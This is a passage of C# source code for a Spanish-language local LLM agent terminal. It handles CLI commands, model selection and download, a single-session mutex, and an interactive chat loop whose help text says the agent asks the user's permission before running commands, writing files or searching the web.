using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace ECnet;

public sealed class TerminalException : Exception
{
    public TerminalException(string message) : base(message)
    {
    }

    public TerminalException(string message, Exception innerException) : base(message, innerException)
    {
    }
}

public sealed class TerminalApplication
{
    private AppConfig config = new(null);
    private ModelCatalog catalog = new(AppConfig.DefaultModelDirectory);
    private bool jsonOutput;
    private bool noBanner;
    private Mutex? modelInstanceMutex;
    private StatsSnapshot? lastStats;

    private const string ModelInstanceMutexName = "IA27Terminal.portable.model";
    
    public async Task<int> RunAsync(string[] args)
    {
        config = AppConfig.Load();
        var positional = ApplyOptions(args);
        config.Normalize();
        catalog = new ModelCatalog(config.ModelDirectory);

        if (positional.Count == 0)
        {
            return await RunGuardedAsync(true, () => RunAgentAsync(null));
        }

        var command = positional[0].ToLowerInvariant();
        var rest = positional.Skip(1).ToArray();
        return await RunGuardedAsync(RequiresModel(command), () => command switch
        {
            "help" or "ayuda" or "--help" or "-h" => Task.FromResult(RunHelp()),
            "version" or "--version" => Task.FromResult(RunVersion()),
            "list" or "listar" or "models" or "modelos" => Task.FromResult(RunList(rest)),
            "info" or "informacion" => Task.FromResult(RunInfo(rest.FirstOrDefault())),
            "run" or "ask" or "preguntar" => RunOneShotAsync(rest),
            "agent" or "agente" or "chat" => RunAgentAsync(rest.FirstOrDefault()),
            "doctor" or "diagnostico" => RunDoctorAsync(),
            "config" or "configuracion" => Task.FromResult(RunConfig(rest)),
            "serve" or "servidor" => RunServerAsync(rest.FirstOrDefault()),
            "descargar" or "download" => RunDownloadMenu(rest),
            _ => throw new TerminalException($"Comando desconocido: {command}. Usa 'help'.")
        });
    }

    /// <summary>
    /// Un mutex por los comandos que cargan el modelo. Dos sesiones a la vez son
    /// ~7 GB cada una y no entran en los 15,9 GB de RAM: la segunda se queda
    /// colgada en "Cargando el modelo" sin dar error (PARTE 8, incidente 20).
    /// Los comandos que no cargan el modelo (listar, info, config, help) pasan
    /// sin tocar el mutex.
    /// </summary>
    private static bool RequiresModel(string command)
    {
        return command is
            "run" or "ask" or "preguntar" or
            "agent" or "agente" or "chat" or
            "serve" or "servidor" or "doctor";
    }

    private async Task<int> RunGuardedAsync(bool needsModel, Func<Task<int>> action)
    {
        if (needsModel && !TryLockModelInstance())
        {
            throw new TerminalException(BuildConcurrentSessionMessage());
        }

        try
        {
            return await action();
        }
        finally
        {
            ReleaseModelInstance();
        }
    }

    private bool TryLockModelInstance()
    {
        if (!OperatingSystem.IsWindows())
        {
            return true;
        }

        try
        {
            var mutex = new Mutex(true, ModelInstanceMutexName, out var createdNew);
            if (createdNew)
            {
                modelInstanceMutex = mutex;
                return true;
            }

            mutex.Dispose();
            return false;
        }
        catch (AbandonedMutexException)
        {
            try
            {
                modelInstanceMutex = new Mutex(true, ModelInstanceMutexName);
            }
            catch (Exception)
            {
            }

            return true;
        }
        catch (Exception)
        {
            return true;
        }
    }

    private void ReleaseModelInstance()
    {
        var mutex = modelInstanceMutex;
        modelInstanceMutex = null;
        if (mutex is null)
        {
            return;
        }

        try
        {
            mutex.ReleaseMutex();
        }
        catch (ApplicationException)
        {
        }

        mutex.Dispose();
    }

    private static string BuildConcurrentSessionMessage()
    {
        var orphans = Process.GetProcessesByName("llama-server");
        var detail = orphans.Length == 0
            ? string.Empty
            : $"Hay {orphans.Length} proceso(s) llama-server usando {Math.Round(orphans.Sum(p => p.WorkingSet64) / 1048576.0)} MB de RAM.";

        return "Ya hay otra sesión de IA27 Terminal cargando el modelo." + Environment.NewLine +
               Environment.NewLine + detail + Environment.NewLine +
               "Cada sesión usa ~7 GB de RAM: dos a la vez no entran y la segunda se queda" + Environment.NewLine +
               "colgada en \"Cargando el modelo\" sin dar ningún error. Esperá a que termine la" + Environment.NewLine +
               "otra, o liberá los procesos huérfanos:" + Environment.NewLine +
               "    Get-Process llama-server | Stop-Process -Force";
    }

    private List<string> ApplyOptions(string[] args)
    {
        var positional = new List<string>();
        for (var index = 0; index < args.Length; index++)
        {
            var argument = args[index];
            switch (argument)
            {
                case "--model-dir":
                    config.ModelDirectory = ReadOptionValue(args, ref index, argument);
                    break;
                case "--runtime-dir":
                    config.RuntimeDirectory = ReadOptionValue(args, ref index, argument);
                    break;
                case "--model":
                    config.SelectedModel = ReadOptionValue(args, ref index, argument);
                    break;
                case "--context":
                    config.ContextSize = ReadIntOption(args, ref index, argument);
                    break;
                case "--max-tokens":
                    config.MaxTokens = ReadIntOption(args, ref index, argument);
                    break;
                case "--threads":
                    config.Threads = ReadIntOption(args, ref index, argument);
                    break;
                case "--gpu-layers":
                    config.GpuLayers = ReadIntOption(args, ref index, argument);
                    break;
                case "--temperature":
                    config.Temperature = ReadDoubleOption(args, ref index, argument);
                    break;
                case "--repeat-penalty":
                    config.RepeatPenalty = ReadDoubleOption(args, ref index, argument);
                    break;
                case "--top-p":
                    config.TopP = ReadDoubleOption(args, ref index, argument);
                    break;
                case "--chat-template":
                    config.ChatTemplate = ReadOptionValue(args, ref index, argument);
                    break;
                case "--timeout":
                    config.StartupTimeoutSeconds = ReadIntOption(args, ref index, argument);
                    break;
                case "--json":
                    jsonOutput = true;
                    break;
                case "--no-banner":
                    noBanner = true;
                    break;
                default:
                    positional.Add(argument);
                    break;
            }
        }

        return positional;
    }

    /// <summary>
    /// Ayuda de la SESIÓN INTERACTIVA, un comando por línea. La versión anterior
    /// concatenaba todos los comandos en una sola línea muy larga: en una consola
    /// angosta se partía y se leía como un solo bloque de texto sin sentido.
    /// </summary>
    private void WriteInteractiveHelp()
    {
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== COMANDOS DE LA SESIÓN =====================//");
        Console.ForegroundColor = ConsoleColor.Cyan;

        void Row(string cmd, string desc)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("  " + cmd.PadRight(24));
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(desc);
        }

        Row("/help", "esta ayuda");
        Row("/clear", "limpiar el historial");
        Row("/history", "muestra el historial de la sesión");
        Row("/system [texto]", "consulta o cambia la instrucción de sistema");
        Row("/modelos", "lista y cambia de modelo");
        Row("/cambiar", "selector de modelos");
        Row("/use <selector>", "cambia de modelo");
        Row("/descargar", "descarga un modelo nuevo");
        Row("/temp [valor]", "temperatura");
        Row("/rp [valor]", "penalización por repetición");
        Row("/topp [valor]", "top-p");
        Row("/tokens [valor]", "tokens máximos por respuesta");
        Row("/net [on|off]", "activa o desactiva la búsqueda");
        Row("/harness <objetivo>", "modo agéntico por pasos");
        Row("/stats", "tokens y velocidad del último turno");
        Row("/exit", "salir de la sesión");

        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== HERRAMIENTAS DEL AGENTE ==================//");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine("  El agente puede leer archivos y carpetas, ejecutar");
        Console.WriteLine("  comandos de PowerShell, escribir archivos, ejecutar");
        Console.WriteLine("  código Python y buscar en internet.");
        Console.WriteLine();
        Console.WriteLine("  La ejecución, la escritura y el código Python SIEMPRE");
        Console.WriteLine("  piden tu permiso: píldoras [permitir] [denegar] con las");
        Console.WriteLine("  flechas, o s/n cuando la entrada está pipeada.");
        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== ATAJOS ======================================//");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine("  Ctrl+C  detener la respuesta en curso");
        Console.WriteLine("  Ctrl+D  salir de la sesión");
        Console.WriteLine("  F1      permitir (equivalente a clic en la píldora)");
        Console.WriteLine("  F2      denegar  (equivalente a clic en la píldora)");
        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== NOTAS ======================================//");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine("  /tokens 512 produce respuestas más cortas.");
        Console.WriteLine("  /harness planifica, usa herramientas, verifica y");
        Console.WriteLine("  termina solo con [[DONE]] (máx. 15 pasos).");
        Console.WriteLine();
        Console.ForegroundColor = ConsoleColor.DarkGray;
         Console.WriteLine("  Las pestañas de conversación NO están en la consola.");
    }

    private int RunHelp()
    {
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== ESTALINGRADO CORP · INTRA-NET ==//");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("IA27 Terminal portable · agente IA local (modelos GGUF, sin Python)");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine();
        Console.WriteLine("Uso:");
        Console.WriteLine("  portable.exe [comando] [argumentos]");
        Console.WriteLine();
        Console.WriteLine("Comandos:");
        Console.WriteLine("  listar                         lista los modelos GGUF");
        Console.WriteLine("  info [modelo]                  muestra los datos del modelo");
        Console.WriteLine("  agente [modelo]                abre una sesión interactiva");
        Console.WriteLine("  preguntar [modelo] <mensaje>   ejecuta una consulta única");
        Console.WriteLine("  servidor [modelo]              inicia el servidor local API");
        Console.WriteLine("  doctor                         comprueba modelo, runtime y hardware");
        Console.WriteLine("  descargar                       descarga o selecciona modelos agente");
        Console.WriteLine("  config show|set|reset|path     gestiona la configuración");
        Console.WriteLine("  help                           muestra esta ayuda");
        Console.WriteLine();
        Console.WriteLine("Ejemplos:");
        Console.WriteLine("  portable.exe listar");
        Console.WriteLine("  portable.exe preguntar \"Explica qué es un agente local\"");
        Console.WriteLine("  portable.exe agente");
        Console.WriteLine();
        Console.WriteLine("Opciones globales:");
        Console.WriteLine("  --model-dir RUTA               cambia la carpeta de modelos");
        Console.WriteLine("  --runtime-dir RUTA             cambia la carpeta de ecnet_bin");
        Console.WriteLine("  --model SELECTOR               selecciona el modelo por nombre o número");
        Console.WriteLine("  --context N --max-tokens N      ajusta contexto y respuesta");
        Console.WriteLine("  --threads N --gpu-layers N      ajusta CPU y GPU");
        Console.WriteLine("  --temperature N                ajusta la temperatura");
        Console.WriteLine("  --repeat-penalty N             evita repeticiones (1.1 por defecto)");
        Console.WriteLine("  --top-p N                      muestreo top-p (0.9 por defecto)");
        Console.WriteLine("  --chat-template NOMBRE         plantilla de chat (chatml por defecto)");
        Console.WriteLine("  --timeout N                    segundos de espera al cargar el modelo");
        Console.WriteLine("  --json                         salida JSON para listar");
        return 0;
    }

    private int RunVersion()
    {
        var version = typeof(TerminalApplication).Assembly.GetName().Version?.ToString() ?? "1.0.0";
        Console.WriteLine($"IA27 Terminal {version}");
        Console.WriteLine("Runtime: C#/.NET 8 + ECnet; Python requerido: no");
        return 0;
    }

    private int RunList(IReadOnlyList<string> rest)
    {
        var selectedCatalog = rest.Count > 0 ? new ModelCatalog(rest[0]) : catalog;
        var models = selectedCatalog.List();
        if (jsonOutput)
        {
            Console.WriteLine(JsonSerializer.Serialize(models, new JsonSerializerOptions { WriteIndented = true }));
            return models.Count == 0 ? 1 : 0;
        }

        Console.WriteLine($"Carpeta: {selectedCatalog.Root}");
        if (models.Count == 0)
        {
            Console.WriteLine("No se encontraron archivos .gguf.");
            return 1;
        }

        Console.WriteLine();
        Console.WriteLine("ID   MODELO                                      TAMAÑO       MODIFICADO");
        Console.WriteLine("---  ------------------------------------------  -----------  --------------------");
        for (var index = 0; index < models.Count; index++)
        {
            var model = models[index];
            Console.WriteLine($"{index + 1,-3}  {Truncate(model.RelativePath, 42),-42}  {FormatBytes(model.SizeBytes),-11}  {model.LastWriteTimeLocal:yyyy-MM-dd HH:mm}");
        }

        Console.WriteLine();
        Console.WriteLine("Usa 'info 1', 'agente 1' o 'preguntar 1 mensaje'.");
        return 0;
    }

    private int RunInfo(string? selector)
    {
        var model = ResolveModel(selector);
        var gguf = GgufMetadataReader.TryRead(model.Path);
        var runtime = RuntimeLocator.Find(config.RuntimeDirectory, config.ModelDirectory);
        var architecture = gguf is null ? string.Empty : MetadataText(gguf.Metadata, "general.architecture");
        var context = gguf is null ? null : MetadataValue(gguf.Metadata, architecture, "context_length");
        var parameterCount = gguf is null ? null : GeneralParameterCount(gguf.Metadata);
        var quantization = gguf is null ? string.Empty : QuantizationName(GeneralMetadataValue(gguf.Metadata, "general.file_type"), model.Name);

        Console.WriteLine($"Nombre:       {model.Name}");
        Console.WriteLine($"Ruta:         {model.Path}");
        Console.WriteLine($"Tamaño:       {FormatBytes(model.SizeBytes)} ({model.SizeBytes:N0} bytes)");
        Console.WriteLine($"Modificado:   {model.LastWriteTimeLocal:yyyy-MM-dd HH:mm:ss}");
        Console.WriteLine($"Formato:      GGUF v{(gguf?.Version.ToString() ?? "desconocido")}");
        Console.WriteLine($"Arquitectura: {(string.IsNullOrWhiteSpace(architecture) ? "desconocida" : architecture)}");
        Console.WriteLine($"Cuantización: {(string.IsNullOrWhiteSpace(quantization) ? "desconocida" : quantization)}");
        Console.WriteLine($"Parámetros:   {FormatParameterCount(parameterCount)}");
        Console.WriteLine($"Contexto:     {FormatValue(context)}");
        Console.WriteLine($"Tensores:     {gguf?.TensorCount.ToString() ?? "desconocido"}");
        Console.WriteLine($"Runtime:      {runtime ?? "no encontrado"}");
        if (gguf is null)
        {
            Console.WriteLine("Cabecera:     no se pudo leer; el servidor puede diagnosticarlo.");
        }
        else
        {
            var template = MetadataText(gguf.Metadata, "tokenizer.chat_template");
            Console.WriteLine($"Chat template: {(string.IsNullOrWhiteSpace(template) ? "no declarado" : "disponible")}");
        }

        return 0;
    }

    private async Task<int> RunOneShotAsync(IReadOnlyList<string> rest)
    {
        if (rest.Count == 0)
        {
            throw new TerminalException("Falta el mensaje. Ejemplo: preguntar \"Hola\"");
        }

        string? selector = null;
        string prompt;
        if (rest.Count > 1 && catalog.TryResolve(rest[0], out _))
        {
            selector = rest[0];
            prompt = string.Join(" ", rest.Skip(1));
        }
        else
        {
            prompt = string.Join(" ", rest);
        }

        if (string.IsNullOrWhiteSpace(prompt))
        {
            throw new TerminalException("El mensaje está vacío.");
        }

        var model = ResolveModel(selector);
        using var cancellation = new CancellationTokenSource();
        ConsoleCancelEventHandler handler = (_, eventArgs) =>
        {
            eventArgs.Cancel = true;
            cancellation.Cancel();
        };
        Console.CancelKeyPress += handler;
        try
        {
            await using var session = new ECnetServerSession(config, model);
            Console.WriteLine($"[1/2] Cargando {model.Name}...");
            await session.StartAsync(cancellation.Token);
            Console.WriteLine("[2/2] Consultando el agente local...");
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("IA27> ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            using var notice = new GenerationNotice();
            await AskWithNetPermissionAsync(session, prompt, piece =>
            {
                notice.OnToken();
                lock (GenerationNotice.Sync)
                {
                    Console.Write(piece);
                }
                return Task.CompletedTask;
            }, cancellation.Token);
            Console.WriteLine();
            Console.WriteLine();
            return 0;
        }
        catch (OperationCanceledException)
        {
            return 130;
        }
        finally
        {
            Console.CancelKeyPress -= handler;
        }
    }

    private async Task<int> RunAgentAsync(string? selector)
    {
        var requestedModel = selector ?? config.SelectedModel;

        if (string.IsNullOrWhiteSpace(requestedModel))
        {
            requestedModel = await SelectOrDownloadModel();
            if (requestedModel is null)
            {
                return 1;
            }
            config.SelectedModel = requestedModel;
        }

        var firstBanner = !noBanner;

        while (true)
        {
            ModelDescriptor model;
            try
            {
                model = ResolveModel(requestedModel);
            }
            catch (TerminalException error)
            {
                Console.Error.WriteLine(error.Message);
                return 1;
            }

            if (firstBanner)
            {
                PrintBanner(model);
                firstBanner = false;
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine($"Cambiando a: {model.Name}");
            }

            using var cancellation = new CancellationTokenSource();
            var cancelState = new ConsoleCancelState();
            ConsoleCancelEventHandler handler = (_, eventArgs) =>
            {
                eventArgs.Cancel = true;
                if (cancelState.Generation is { } activeGeneration)
                {
                    activeGeneration.Cancel();
                }
                else
                {
                    cancellation.Cancel();
                }
            };
            Console.CancelKeyPress += handler;
            try
            {
                await using var session = new ECnetServerSession(config, model);
                Console.WriteLine("Cargando el modelo; la primera carga puede tardar...");
                await session.StartAsync(cancellation.Token);
                Console.WriteLine("Listo. Escribe /help para ver los comandos del agente. Ctrl+C detiene la respuesta en curso.");
                Console.WriteLine();
                if (config.NetEnabled)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("[INTRANET] ¿Permitir que el agente busque en internet automáticamente en esta sesión? (s/n): ");
                    Console.ForegroundColor = ConsoleColor.White;
                    var netAnswer = Console.ReadLine()?.Trim().ToLowerInvariant();
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    var allowAuto = netAnswer is "s" or "si" or "sí" or "y" or "yes";
                    session.NetAutoAllowed = allowAuto;
                    Console.ForegroundColor = allowAuto ? ConsoleColor.Gray : ConsoleColor.DarkGray;
                    Console.WriteLine(allowAuto
                        ? "  Internet autorizado para esta sesión. El agente buscará automáticamente cuando necesite datos actuales."
                        : "  Internet denegado. El agente usará solo su conocimiento local.");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine();
                }

                var action = await RunAgentLoopAsync(session, cancellation.Token, cancelState);
                if (action.SwitchTo is not null)
                {
                    requestedModel = action.SwitchTo;
                    continue;
                }

                return 0;
            }
            catch (OperationCanceledException)
            {
                return 130;
            }
            catch (TerminalException error)
            {
                Console.Error.WriteLine($"Error: {error.Message}");
                return 1;
            }
            finally
            {
                Console.CancelKeyPress -= handler;
            }
        }
    }

    private async Task<SessionAction> RunAgentLoopAsync(ECnetServerSession session, CancellationToken cancellationToken, ConsoleCancelState cancelState)
    {
        while (true)
        {
            cancellationToken.ThrowIfCancellationRequested();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("tú> ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            var input = Console.ReadLine();
            if (input is null)
            {
                return new SessionAction(true, null);
            }

            input = input.Trim();
            if (input.Length == 0)
            {
                continue;
            }

            if (input.StartsWith('/'))
            {
                var action = await HandleAgentCommandAsync(session, input, cancellationToken);
                if (action is not null)
                {
                    return action;
                }

                continue;
            }

            // Comandos sin "/": el usuario escribe "net on" esperando el comando,
            // y sin esta normalización le llega al modelo como chat (P15.37).
            // Solo se normalizan formas inequívocas (una sola palabra conocida,
            // "net on|off", o "<comando> <número>"): nunca texto libre.
            var bareCommand = NormalizeBareCommand(input);
            if (bareCommand is not null)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine($"  (interpreto \"{input}\" como {bareCommand}; el / delante también vale)");
                Console.ForegroundColor = ConsoleColor.Cyan;
                var bareAction = await HandleAgentCommandAsync(session, bareCommand, cancellationToken);
                if (bareAction is not null)
                {
                    return bareAction;
                }

                continue;
            }

            using var turn = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            cancelState.Generation = turn;
            using var notice = new GenerationNotice();
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.Write("IA27> ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                await AskWithNetPermissionAsync(session, input, piece =>
                {
                    notice.OnToken();
                    lock (GenerationNotice.Sync)
                    {
                        Console.Write(piece);
                    }
                    return Task.CompletedTask;
                }, turn.Token);
                Console.WriteLine();
                Console.WriteLine();
            }
            catch (OperationCanceledException) when (turn.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
            {
                Console.WriteLine();
                Console.WriteLine("[generación detenida]");
            }
            catch (TerminalException error)
            {
                NotificationHelper.NotifyError(Truncate(error.Message, 100));
                Console.Error.WriteLine($"Error: {error.Message}");
            }
            finally
            {
                lastStats = notice.GetStats();
                cancelState.Generation = null;
                if (!turn.IsCancellationRequested)
                {
                    NotificationHelper.NotifyModelFinished("Respuesta completada");
                }
            }
        }
    }

    private async Task<SessionAction?> HandleAgentCommandAsync(ECnetServerSession session, string input, CancellationToken cancellationToken = default)
    {
        var separator = input.IndexOf(' ');
        var command = (separator < 0 ? input : input[..separator]).ToLowerInvariant();
        var argument = separator < 0 ? string.Empty : input[(separator + 1)..].Trim();
        switch (command)
        {
            case "/exit":
            case "/quit":
            case "/salir":
                return new SessionAction(true, null);
            case "/help":
            case "/ayuda":
                WriteInteractiveHelp();
                break;
            case "/stats":
            case "/estadisticas":
                if (lastStats is not null)
                {
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.WriteLine("//== ESTADÍSTICAS DE SESIÓN =============================================//");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine($"  Tokens generados:  {lastStats.TotalTokens:N0}");
                    Console.WriteLine($"  Tiempo transcurrido:  {lastStats.Elapsed:mm\\:ss}");
                    Console.WriteLine($"  Velocidad:  {lastStats.TokensPerSecond:0.0} tok/s");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("  (Última generación completada; se reinicia en cada turno)");
                }
                else
                {
                    Console.WriteLine("Aún no hay estadísticas (primera generación en curso o no hubo turnos).");
                }
                break;
            case "/clear":
            case "/limpiar":
                session.ClearHistory();
                Console.WriteLine("Historial limpiado.");
                break;
            case "/history":
            case "/historial":
                PrintHistory(session);
                break;
            case "/system":
            case "/sistema":
                if (argument.Length == 0)
                {
                    Console.WriteLine(session.History.FirstOrDefault(message => message.Role == "system")?.Content ?? config.SystemPrompt);
                }
                else
                {
                    session.SetSystemPrompt(argument);
                    Console.WriteLine("Instrucción de sistema actualizada.");
                }
                break;
            case "/model":
            case "/modelo":
            case "/modelos":
            case "/models":
                if (argument.Length == 0)
                {
                    var allModels = catalog.List();
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.WriteLine("//== MODELOS INSTALADOS =================================================//");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    for (var modelIndex = 0; modelIndex < allModels.Count; modelIndex++)
                    {
                        var marker = allModels[modelIndex].Name == session.Model.Name ? " ← actual" : "";
                        Console.ForegroundColor = marker.Length > 0 ? ConsoleColor.White : ConsoleColor.Cyan;
                        Console.WriteLine($"  {modelIndex + 1}. {allModels[modelIndex].Name} ({FormatBytes(allModels[modelIndex].SizeBytes)}){marker}");
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    Console.Write("  Escribe un número para cambiar, /descargar para bajar más, o Enter para continuar: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    var modelChoice = Console.ReadLine()?.Trim();
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    if (string.IsNullOrWhiteSpace(modelChoice))
                    {
                        Console.WriteLine();
                        break;
                    }

                    if (modelChoice.Equals("/descargar", StringComparison.OrdinalIgnoreCase))
                    {
                        var downloadedModel = await DownloadAndSelect();
                        if (downloadedModel is not null)
                        {
                            return new SessionAction(false, downloadedModel);
                        }
                        break;
                    }

                    if (int.TryParse(modelChoice, out var modelNumber) && modelNumber > 0 && modelNumber <= allModels.Count)
                    {
                        return new SessionAction(false, allModels[modelNumber - 1].Name);
                    }

                    return new SessionAction(false, modelChoice);
                }
                else
                {
                    return new SessionAction(false, argument);
                }
            case "/use":
            case "/usar":
            case "/cambiar":
            case "/switch":
                if (argument.Length == 0)
                {
                    var switchModels = catalog.List();
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.WriteLine("//== CAMBIAR MODELO =====================================================//");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    for (var switchIndex = 0; switchIndex < switchModels.Count; switchIndex++)
                    {
                        var switchMarker = switchModels[switchIndex].Name == session.Model.Name ? " ← actual" : "";
                        Console.ForegroundColor = switchMarker.Length > 0 ? ConsoleColor.White : ConsoleColor.Cyan;
                        Console.WriteLine($"  {switchIndex + 1}. {switchModels[switchIndex].Name}{switchMarker}");
                    }
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.Write("  Número del modelo: ");
                    Console.ForegroundColor = ConsoleColor.White;
                    var switchChoice = Console.ReadLine()?.Trim();
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    if (int.TryParse(switchChoice, out var switchNumber) && switchNumber > 0 && switchNumber <= switchModels.Count)
                    {
                        return new SessionAction(false, switchModels[switchNumber - 1].Name);
                    }

                    if (!string.IsNullOrWhiteSpace(switchChoice))
                    {
                        return new SessionAction(false, switchChoice);
                    }
                }
                else
                {
                    return new SessionAction(false, argument);
                }
                break;
            case "/descargar":
            case "/download":
                var downloaded = await DownloadAndSelect();
                if (downloaded is not null)
                {
                    return new SessionAction(false, downloaded);
                }
                break;
            case "/temp":
            case "/temperatura":
                if (double.TryParse(argument, NumberStyles.Float, CultureInfo.InvariantCulture, out var temperature))
                {
                    session.Temperature = Math.Clamp(temperature, 0, 2);
                }
                Console.WriteLine($"Temperatura: {session.Temperature:0.00}");
                break;
            case "/rp":
            case "/repeat-penalty":
                if (double.TryParse(argument, NumberStyles.Float, CultureInfo.InvariantCulture, out var repeatPenalty))
                {
                    session.RepeatPenalty = Math.Clamp(repeatPenalty, 1, 2);
                }
                Console.WriteLine($"Penalización de repetición: {session.RepeatPenalty:0.00}");
                break;
            case "/topp":
            case "/top-p":
                if (double.TryParse(argument, NumberStyles.Float, CultureInfo.InvariantCulture, out var topP))
                {
                    session.TopP = Math.Clamp(topP, 0.1, 1);
                }
                Console.WriteLine($"Top-P: {session.TopP:0.00}");
                break;
            case "/net":
            case "/internet":
                if (argument.Length > 0)
                {
                    session.SetNetEnabled(argument is "on" or "si" or "sí" or "yes" or "true");
                    try
                    {
                        config.Save();
                    }
                    catch (IOException)
                    {
                    }
                    catch (UnauthorizedAccessException)
                    {
                    }
                }
                Console.WriteLine(config.NetEnabled
                    ? "Internet: on — el modelo pedirá tu permiso antes de cada búsqueda."
                    : "Internet: off — el modelo responderá solo con su conocimiento local.");
                break;
            case "/harness":
            case "/agente":
                await RunHarnessAsync(session, argument, cancellationToken);
                break;
            case "/tokens":
            case "/max-tokens":
                if (int.TryParse(argument, NumberStyles.Integer, CultureInfo.InvariantCulture, out var maxTokens))
                {
                    session.MaxTokens = Math.Clamp(maxTokens, 1, 131_072);
                }
                Console.WriteLine($"Tokens máximos: {session.MaxTokens}");
                break;
            default:
                Console.WriteLine("Comando desconocido. Usa /help.");
                break;
        }

        return null;
    }

    private async Task<string?> SelectOrDownloadModel()
    {
        var models = catalog.List();
        if (models.Count == 1)
        {
            return models[0].Name;
        }

        if (models.Count > 1)
        {
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.WriteLine("//== MODELOS DISPONIBLES ================================================//");
            Console.ForegroundColor = ConsoleColor.Cyan;
            for (var index = 0; index < models.Count; index++)
            {
                Console.WriteLine($"  {index + 1}. {models[index].Name} ({FormatBytes(models[index].SizeBytes)})");
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine();
            Console.Write("  Escribe /descargar para ver más modelos agente o elige un número (Enter = 1): ");
            Console.ForegroundColor = ConsoleColor.White;
            var input = Console.ReadLine()?.Trim();
            Console.ForegroundColor = ConsoleColor.Cyan;
            if (string.IsNullOrWhiteSpace(input) || input == "1" && models.Count > 0)
            {
                return models[0].Name;
            }

            if (input.Equals("/descargar", StringComparison.OrdinalIgnoreCase) || input.Equals("descargar", StringComparison.OrdinalIgnoreCase))
            {
                return await DownloadAndSelect();
            }

            if (int.TryParse(input, out var selection) && selection > 0 && selection <= models.Count)
            {
                return models[selection - 1].Name;
            }

            return models[0].Name;
        }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("  No hay modelos instalados.");
        Console.ForegroundColor = ConsoleColor.Cyan;
        return await DownloadAndSelect();
    }

    private async Task<string?> DownloadAndSelect()
    {
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine("//== MODELOS AGENTE DISPONIBLES PARA DESCARGAR ==========================//");
        Console.ForegroundColor = ConsoleColor.Cyan;

        var available = ModelRegistry.Models.ToList();
        for (var index = 0; index < available.Count; index++)
        {
            var info = available[index];
            var downloaded = info.Url == "local" || File.Exists(Path.Combine(config.ModelDirectory, info.FileName));
            var status = downloaded ? "[instalado]" : $"[{info.SizeGb:0.0} GB]";
            Console.ForegroundColor = downloaded ? ConsoleColor.Gray : ConsoleColor.Cyan;
            Console.WriteLine($"  {index + 1}. {info.Name,-35} {status,-12} {info.Strengths}");
        }

        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine();
        Console.Write("  Escribe el número del modelo a descargar/usar (0 = cancelar, Enter = 1): ");
        Console.ForegroundColor = ConsoleColor.White;
        var input = Console.ReadLine()?.Trim();
        Console.ForegroundColor = ConsoleColor.Cyan;
        if (string.IsNullOrWhiteSpace(input))
        {
            input = "1";
        }

        if (!int.TryParse(input, out var choice) || choice < 0 || choice > available.Count)
        {
            Console.WriteLine("  Selección inválida.");
            return null;
        }

        if (choice == 0)
        {
            return null;
        }

        var selected = available[choice - 1];
        if (selected.Url == "local" || File.Exists(Path.Combine(config.ModelDirectory, selected.FileName)))
        {
            return selected.FileName;
        }

        Console.WriteLine();
        Console.WriteLine($"  Vas a descargar {selected.Name} ({selected.SizeGb:0.0} GB).");
        Console.Write("  Confirmar? (s/n): ");
        Console.ForegroundColor = ConsoleColor.White;
        var confirm = Console.ReadLine()?.Trim().ToLowerInvariant();
        Console.ForegroundColor = ConsoleColor.Cyan;
        if (confirm is not ("s" or "si" or "sí" or "y" or "yes"))
        {
            return null;
        }

        try
        {
            Console.WriteLine();
            using var cancellation = new CancellationTokenSource();
            await ModelRegistry.DownloadAsync(config.ModelDirectory, selected, cancellation.Token);
            Console.WriteLine($"  Modelo {selected.Name} instalado en: {config.ModelDirectory}");
            return selected.FileName;
        }
        catch (Exception error)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"  Error descargando: {error.Message}");
            Console.ForegroundColor = ConsoleColor.Cyan;
            return null;
        }
    }

